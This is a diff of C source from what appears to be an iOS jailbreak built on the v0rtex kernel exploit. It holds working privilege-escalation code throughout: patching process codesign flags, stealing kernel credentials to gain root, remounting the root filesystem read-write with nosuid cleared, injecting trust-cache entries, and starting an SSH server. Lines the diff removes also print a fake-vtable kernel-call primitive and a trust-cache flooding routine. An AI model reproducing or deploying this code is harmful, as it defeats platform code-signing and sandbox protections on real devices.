@@ -124,33 +124,73 @@ uint8_t *getSHA256(const uint8_t* code_dir) {
 }
 
 #include <mach-o/loader.h>
+#include <mach-o/fat.h>
 uint8_t *getCodeDirectory(const char* name) {
     // Assuming it is a macho
-    
-    FILE* fd = fopen(name, "r");
+
+    uint8_t* retval = NULL;
+
+    char realname[4096];
+    if (realpath(name, realname) == 0)
+        return NULL;
+
+    FILE* fd = fopen(realname, "r");
+    if (fd == NULL)
+        return NULL;
 
     uint32_t magic;
     fread(&magic, sizeof(magic), 1, fd);
     fseek(fd, 0, SEEK_SET);
 
-    long off;
-    int ncmds;
+    long off = 0;
+    int ncmds = 0;
+
+    if (magic == FAT_MAGIC || magic == FAT_MAGIC_64) {
+
+        struct fat_header fh;
+        fread(&fh, sizeof(fh), 1, fd);
+
+        if (magic == FAT_MAGIC) {
+//        printf("%s is fat macho\n", name);
+            struct fat_arch fa;
+            for (int i = 0; i != fh.nfat_arch; ++i) {
+                fread(&fa, sizeof(fa), 1, fd);
+                if (fa.cputype & CPU_TYPE_ARM) {
+                    off = fa.offset;
+                    break;
+                }
+            }
+        } else if (magic == FAT_MAGIC_64) {
+//            printf("%s is fat64 macho\n", name);
+            struct fat_arch_64 fa;
+            for (int i = 0; i != fh.nfat_arch; ++i) {
+                fread(&fa, sizeof(fa), 1, fd);
+                if (fa.cputype & CPU_TYPE_ARM) {
+                    off = fa.offset;
+                    break;
+                }
+            }
+        }
+
+        fseek(fd, off, SEEK_SET);
+        fread(&magic, sizeof(magic), 1, fd);
+    }
 
     if (magic == MH_MAGIC_64) {
 //        printf("%s is 64bit macho\n", name);
         struct mach_header_64 mh64;
         fread(&mh64, sizeof(mh64), 1, fd);
-        off = sizeof(mh64);
+        off += sizeof(mh64);
         ncmds = mh64.ncmds;
     } else if (magic == MH_MAGIC) {
         struct mach_header mh;
-//        printf("%s is 32bit macho\n", name);
+        //        printf("%s is 32bit macho\n", name);
         fread(&mh, sizeof(mh), 1, fd);
         off = sizeof(mh);
         ncmds = mh.ncmds;
     } else {
-        printf("%s is not a macho! (or has foreign endianness?) (magic: %x)\n", name, magic);
-        return NULL;
+        printf("%s is not a macho! (or has foreign arch?) (magic: %x)\n", name, magic);
+        goto ret;
     }
 
     for (int i = 0; i < ncmds; i++) {
@@ -167,13 +207,16 @@ uint8_t *getCodeDirectory(const char* name) {
             uint8_t *cd = malloc(size_cs);
             fseek(fd, off_cs, SEEK_SET);
             fread(cd, size_cs, 1, fd);
-            return cd;
+            retval = cd; goto ret;
         } else {
 //            printf("'%s': loadcmd %02x\n", name, cmd.cmd);
             off += cmd.cmdsize;
         }
     }
-    return NULL;
+
+ret:;
+    if (fd != NULL) fclose(fd);
+    return retval;
 }
 
 unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
@@ -280,69 +323,6 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 	uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
 	printf("slide: 0x%016llx\n", slide);
 	
-	// From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
-	uint64_t IOSurfaceRootUserClient_port = find_port_address(user_client, MACH_MSG_TYPE_MAKE_SEND); // UserClients are just mach_ports, so we find its address
-	uint64_t IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
-	uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
-	
-	// The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
-	// Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
-
-	
-	// Create the vtable in the kernel memory, then copy the existing vtable into there
-	uint64_t fake_vtable = kalloc(0x1000);
-	printf("Created fake_vtable at %016llx\n", fake_vtable);
-	
-	for (int i = 0; i < 0x200; i++) {
-		wk64(fake_vtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
-	}
-	
-	printf("Copied some of the vtable over\n");
-	
-	
-	// Create the fake user client
-	uint64_t fake_client = kalloc(0x1000);
-	printf("Created fake_client at %016llx\n", fake_client);
-	
-	for (int i = 0; i < 0x200; i++) {
-		wk64(fake_client+i*8, rk64(IOSurfaceRootUserClient_addr+i*8));
-	}
-	
-	printf("Copied the user client over\n");
-	
-	// Write our fake vtable into the fake user client
-	wk64(fake_client, fake_vtable);
-	
-	// Replace the user client with ours
-	wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
-	
-	// Now the userclient port we have will look into our fake user client rather than the old one
-	
-	// Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
-	wk64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
-	
-	printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
-	
-	// When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
-	// to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
-	// This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
-	// function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
-	// through like normal.
-	
-	// Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
-	// We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
-	// (i'm not actually sure if the switch back is necessary but meh
-#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
-do { \
-	uint64_t offx20 = rk64(fake_client+0x40); \
-	uint64_t offx28 = rk64(fake_client+0x48); \
-	wk64(fake_client+0x40, x0); \
-	wk64(fake_client+0x48, addr); \
-	err = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6)); \
-	wk64(fake_client+0x40, offx20); \
-	wk64(fake_client+0x48, offx28); \
-} while (0);
-	
 	// Get our and the kernels struct proc from allproc
 	uint32_t our_pid = getpid();
 	uint64_t our_proc = 0;
@@ -369,7 +349,7 @@ do { \
 			uint32_t csflags = rk32(proc + offsetof_p_csflags);
 			wk32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
 		}
-		proc = rk64(proc);
+        proc = rk64(proc);
 	}
 	
 	printf("our proc is at 0x%016llx\n", our_proc);
@@ -378,7 +358,8 @@ do { \
 	// Give us some special flags
 //	uint32_t csflags = rk32(our_proc + offsetof_p_csflags);
 //	wk32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
-	
+
+#define KCALL(a, x0, x1, x2, x3, x4, x5, x6) kcall_v0rtex(a, 6, x0, x1, x2, x3, x4, x5, x6)
 	// Properly copy the kernel's credentials so setuid(0) doesn't crash
 	uint64_t kern_ucred = 0;
 	KCALL(find_copyout(), kern_proc+0x100, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
@@ -397,42 +378,47 @@ do { \
 	setuid(0);
 	
 	printf("our uid is %d\n", getuid());
-	
+//    willitblend();
+
 	FILE *f = fopen("/var/mobile/test.txt", "w");
 	if (f == 0) {
 		printf("failed to write test file");
 	} else {
 		printf("wrote test file: %p\n", f);
 	}
-	
-	// Remount / as rw - patch by xerub
-	{
-		vm_offset_t off = 0xd8;
-		uint64_t _rootvnode = find_rootvnode();
-		uint64_t rootfs_vnode = rk64(_rootvnode);
-		uint64_t v_mount = rk64(rootfs_vnode + off);
-		uint32_t v_flag = rk32(v_mount + 0x71);
-		
-		wk32(v_mount + 0x71, v_flag & ~(1 << 6));
-		
-		char *nmz = strdup("/dev/disk0s1s1");
+
+
+    // see https://gist.github.com/stek29/e0c8324146b55ca89fe7a24c4164c628 for explaination
+    // Remount / as rw - patch by xerub
+    {
+        vm_offset_t off = 0xd8;
+        uint64_t _rootvnode = find_rootvnode();
+        uint64_t rootfs_vnode = rk64(_rootvnode);
+        uint64_t v_mount = rk64(rootfs_vnode + off);
+        uint32_t v_flag = rk32(v_mount + 0x71);
+
+        wk32(v_mount + 0x71, v_flag & ~(1 << 6));
+
+        char *nmz = strdup("/dev/disk0s1s1");
         int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
-		printf("remounting: %d\n", rv);
-		
-		v_mount = rk64(rootfs_vnode + off);
-		wk32(v_mount + 0x71, v_flag);
-		
-		int fd = open("/.bit_of_fun", O_RDONLY);
-		if (fd == -1) {
-			fd = creat("/.bit_of_fun", 0644);
-		} else {
-			printf("File already exists!\n");
-		}
-		close(fd);
+        printf("remounting: %d\n", rv);
+
+        v_mount = rk64(rootfs_vnode + off);
+        wk32(v_mount + 0x71, v_flag);
+
+        int fd = open("/.bit_of_fun", O_RDONLY);
+        if (fd == -1) {
+            fd = creat("/.bit_of_fun", 0644);
+        } else {
+            printf("File already exists!\n");
+        }
+        close(fd);
+
+        wk32(v_mount + 0x70, rk32(v_mount + 0x70) & ~MNT_NOSUID);
 
         rv = mount("hfs", "/Developer", MNT_UPDATE, (void *)&nmz);
-	}
-	
+    }
+
 	printf("Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
 	
 //	uint8_t launchd[19];
@@ -442,9 +428,15 @@ do { \
 //
 //	printf("%d\n", memcmp(launchd, really, 19)); // == 0
 
-	
 //	mkdir("/Library/LaunchDaemons", 777);
 //	cp("/Library/LaunchDaemons/test_fsigned.plist", plistPath2());
+
+//    printf("fill the shit up...\n");
+//    // see this is what ideas you come up with
+//    // when you're drunk (c) nullpixel
+//    void filltheshitup(void);
+//    filltheshitup();
+//    printf("filled the shit up!!\n");
 
     mkdir("/" BOOTSTRAP_PREFIX, 0777);
     const char *tar = "/" BOOTSTRAP_PREFIX "/tar";
@@ -453,18 +445,27 @@ do { \
     inject_trusts(1, (const char **)&(const char*[]){tar});
 
     int rv;
+    int process_binlist(const char *prefix, const char *path);
 
-    rv = startprog(kern_ucred, tar, (char **)&(const char*[]){ tar, "-xpf", progname("cydia.tar"), "-C", "/", NULL });
-    inject_trusts(1, (const char **)&(const char*[]){"/Applications/Cydia.app/Cydia"});
+    if (access(progname("cydia.tar"), F_OK) != -1) {
+//        if (access("/usr/share/trustme.txt", F_OK) == -1) {
+            rv = startprog(kern_ucred, tar, (char **)&(const char*[]){ tar, "-xpf", progname("cydia.tar"), "-C", "/", NULL });
+//        }
+    }
+
+    if (access("/usr/share/trustme.txt", F_OK) != -1) {
+        rv = process_binlist("/", "/usr/share/trustme.txt");
+        const char *uicache = "/" BOOTSTRAP_PREFIX "/usr/local/bin/uicache";
+        rv = startprog(kern_ucred, uicache, (char **)&(const char*[]){ uicache, NULL });
+    }
+
 
     rv = startprog(kern_ucred, tar, (char **)&(const char*[]){ tar, "-xpf", progname("binpack.tar"), "-C", "/" BOOTSTRAP_PREFIX, NULL });
     unlink(tar);
+    rv = process_binlist(BOOTSTRAP_PREFIX, "/" BOOTSTRAP_PREFIX "/binlist.txt");
 
-    int process_binlist(const char *path);
-    rv = process_binlist("/" BOOTSTRAP_PREFIX "/binlist.txt");
-
-    const char *uicache = "/" BOOTSTRAP_PREFIX "/usr/local/bin/uicache";
-    rv = startprog(kern_ucred, uicache, (char **)&(const char*[]){ uicache, NULL });
+    void start_jailbreakd(void);
+    start_jailbreakd();
 
     if (rv == 0) {
         printf("Dropbear would be up soon\n");
@@ -473,7 +474,7 @@ do { \
         printf("export PATH=\"$BOOTSTRAP_PREFIX/usr/local/bin:$BOOTSTRAP_PREFIX/usr/sbin:$BOOTSTRAP_PREFIX/usr/bin:$BOOTSTRAP_PREFIX/sbin:$BOOTSTRAP_PREFIX/bin\"\n");
         printf(" --- \n");
         const char *dbear = "/" BOOTSTRAP_PREFIX "/usr/local/bin/dropbear";
-        rv = startprog(kern_ucred, dbear, (char **)&(const char*[]){ dbear, "-E", "-m", "-F", "-S", "/" BOOTSTRAP_PREFIX, NULL });
+        rv = startprog(kern_ucred, dbear, (char **)&(const char*[]){ dbear, "-E", "-m", "-F", "-S", "/"/* BOOTSTRAP_PREFIX*/, NULL });
     }
 
 //	sleep(5);
@@ -520,7 +521,7 @@ do { \
 	
 	// Cleanup
 
-	wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
+	
 	
 }
 
@@ -608,7 +609,7 @@ void inject_trusts(int pathc, const char *paths[]) {
 }
 
 
-int process_binlist(const char *path) {
+int process_binlist(const char *prefix, const char *path) {
     // first line -- count since I'm too lazy
 
     FILE *binlist = fopen(path, "r");
@@ -626,8 +627,8 @@ int process_binlist(const char *path) {
     ssize_t nread;
     char readpath[4096];
 
-    strcpy(readpath, "/" BOOTSTRAP_PREFIX "/");
-    char *readto = readpath + strlen("/" BOOTSTRAP_PREFIX "/");
+    snprintf(readpath, sizeof(readpath), "/%s/", prefix);
+    char *readto = readpath + strlen(prefix) + 2;
 
     int i;
     for (i = 0; i != pathcount;) {
@@ -643,7 +644,7 @@ int process_binlist(const char *path) {
             paths[i] = strdup(readpath);
             ++i;
         } else {
-            printf("(/" BOOTSTRAP_PREFIX "/)'%s' in binlist but isn't file/doesn't exist\n", readto);
+            printf("(/%s/)'%s' in binlist but isn't file/doesn't exist\n", prefix, readto);
         }
     }
 
@@ -659,78 +660,6 @@ int process_binlist(const char *path) {
     fclose(binlist);
 
     return 0;
-}
-
-void filltheshitup(void) {
-    uint64_t tc = find_trustcache();
-    printf("trust cache at: %016llx\n", rk64(tc));
-
-#define HASHES_PER_CHAIN 256
-
-#pragma pack(4)
-    struct dat_hash_t {
-        uint64_t a, b;
-        uint32_t c;
-    };
-#pragma pack()
-
-    static_assert(sizeof(struct dat_hash_t) == 20, "");
-
-    struct trust_chain {
-        uint64_t next;                 // +0x00 - the next struct trust_mem
-        unsigned char uuid[16];        // +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
-        unsigned int count;            // +0x18 - Number of hashes there are
-        struct dat_hash_t hash[HASHES_PER_CHAIN];                // +0x1C - The hashes
-    };
-
-    struct trust_chain fake_chain;
-    fake_chain.next = 0;
-
-    *(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
-    *(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
-
-    uint32_t i = 0;
-    uint64_t j = 0;
-    uint64_t k = 0;
-    int idx = 0;
-    uint64_t kernel_trust = kalloc(sizeof(fake_chain));
-    uint64_t initial_trust = kernel_trust;
-
-    do {
-        do {
-            do {
-                fake_chain.hash[idx].a = k;
-                fake_chain.hash[idx].b = j;
-                fake_chain.hash[idx].c = i;
-                ++idx;
-
-                if (idx == HASHES_PER_CHAIN) {
-                    if (i % 4096 == 0) {
-                        printf("copying at 0x%04x %08llx %08llx\n", i, j, k);
-                    }
-
-                    kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
-                    kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
-                    fake_chain.next = kernel_trust;
-                    kernel_trust = kalloc(sizeof(fake_chain));
-
-                    if (kernel_trust == -1) {
-                        printf("OUT OF MEMES!\n");
-                        exit(9);
-                    }
-
-                    idx = 0;
-                }
-
-                ++k;
-            } while (k != 0);
-            ++j;
-        } while (j != 0);
-        ++i;
-    } while (i != 0);
-
-    // Comment this line out to see `amfid` saying there is no signature on test_fsigned (or your binary)
-    wk64(tc, initial_trust);
 }
 
 
@@ -754,10 +683,10 @@ int startprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
                     printf("empower\n");
                     tries = 0;
                     uint64_t self_ucred = 0;
-                    kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
+                    kcall_v0rtex(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
 
-                    kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
-                    kcall(find_bzero(), 2, self_ucred + 0x18, 12);
+                    kcall_v0rtex(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
+                    kcall_v0rtex(find_bzero(), 2, self_ucred + 0x18, 12);
                     break;
                 }
                 proc = rk64(proc);
